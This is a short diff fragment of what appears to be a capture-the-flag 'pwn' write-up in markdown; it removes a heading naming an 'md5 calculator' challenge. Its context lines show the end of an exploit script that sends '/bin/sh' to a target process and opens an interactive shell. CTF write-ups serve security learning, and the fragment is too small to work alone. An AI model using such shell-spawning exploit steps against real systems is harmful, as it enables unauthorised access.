@@ -152,4 +152,3 @@ tags: [pwn, security]
 	p.sendline('/bin/sh')
 	p.interactive()
 	
-### [md5 calculator]
